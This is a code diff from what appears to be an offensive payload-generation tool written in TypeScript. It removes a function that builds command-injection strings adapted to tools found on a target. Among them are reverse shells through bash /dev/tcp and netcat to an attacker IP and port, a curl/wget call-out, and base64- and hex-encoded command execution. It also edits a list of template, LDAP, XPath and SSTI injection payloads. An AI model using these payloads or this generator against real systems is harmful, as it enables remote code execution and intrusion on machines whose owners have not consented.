@@ -2169,69 +2169,6 @@ export function buildContextPayloads(
   /** Build payloads adapted to the available tools detected on the target.
    *  Pass the list from targetProbe.ts probeAvailableTools().
    */
-  export function buildAdaptivePayloads(
-    cmd:            string,
-    availableTools: string[],
-    attackerIp    = "127.0.0.1",
-    attackerPort  = 4444,
-  ): string[] {
-    const has = (tool: string) => availableTools.includes(tool);
-    const set: string[] = [];
-    const q = cmd.replace(/'/g, "'\''");
-
-    // Always include basic injection separators
-    set.push(";" + cmd, "||" + cmd, "&&" + cmd, "|" + cmd);
-
-    if (has("bash")) {
-      set.push(
-        "; bash -c '" + q + "'",
-        "; bash<<<'" + q + "'",
-        "; bash -i >& /dev/tcp/" + attackerIp + "/" + attackerPort + " 0>&1",
-      );
-    }
-    if (has("sh")) {
-      set.push("; sh -c '" + q + "'");
-    }
-    if (has("python3") || has("python")) {
-      const py = has("python3") ? "python3" : "python";
-      set.push(
-        "; " + py + " -c \"import os;os.system('" + q + "')\"",
-        "; " + py + " -c \"import subprocess;subprocess.call(['" + cmd.split(" ")[0] + "'])\"",
-      );
-    }
-    if (has("perl")) {
-      set.push("; perl -e 'system(\"" + q + "\")'");
-    }
-    if (has("ruby")) {
-      set.push("; ruby -e 'exec(\"" + q + "\")'");
-    }
-    if (has("php")) {
-      set.push("; php -r 'system(\"" + q + "\");'");
-    }
-    if (has("curl") || has("wget")) {
-      const dl = has("curl") ? "curl" : "wget -O-";
-      set.push(
-        "; " + dl + " http://" + attackerIp + ":" + attackerPort + "/?" + encodeURIComponent(cmd),
-      );
-    }
-    if (has("nc") || has("ncat") || has("netcat")) {
-      const nc = has("nc") ? "nc" : has("ncat") ? "ncat" : "netcat";
-      set.push("; " + nc + " " + attackerIp + " " + attackerPort + " -e /bin/sh");
-    }
-    if (has("base64")) {
-      const b64cmd = Buffer.from(cmd).toString("base64");
-      set.push("; echo " + b64cmd + "|base64 -d|sh");
-    }
-    if (has("xxd")) {
-      const hexcmd = Buffer.from(cmd).toString("hex");
-      set.push("; echo '" + hexcmd + "'|xxd -r -p|sh");
-    }
-    if (has("awk")) {
-      set.push("; awk 'BEGIN{cmd=\"" + q + "\";system(cmd)}'");
-    }
-
-    return [...new Set(set)].filter(Boolean);
-  }
 
 /* ═══════════════════════════════════════════════════════════════════════════
    POLYMORPHIC PAYLOAD GENERATOR
@@ -2934,7 +2871,6 @@ export function buildDirectInjectionPayloads(cmd: string): string[] {
     `</tag><![CDATA[;${cmd}]]><tag>`,
     /* template injection payloads */
     `{{${cmd}}}`,
-    `${'{'}${'{'}${cmd}${'}'${'}'}}`,
     `\${${cmd}}`,
     `#{${cmd}}`,
     `<%=${cmd}%>`,
@@ -2957,7 +2893,7 @@ export function buildDirectInjectionPayloads(cmd: string): string[] {
     /* LDAP injection */
     `)(${cmd})(`,
     /* XPath injection */
-    `' or '1'='1`;
+    `' or '1'='1`,
     /* SSTI generic */
     `${'{'}7*7${'}'}`  ,
     `{{7*7}}`,
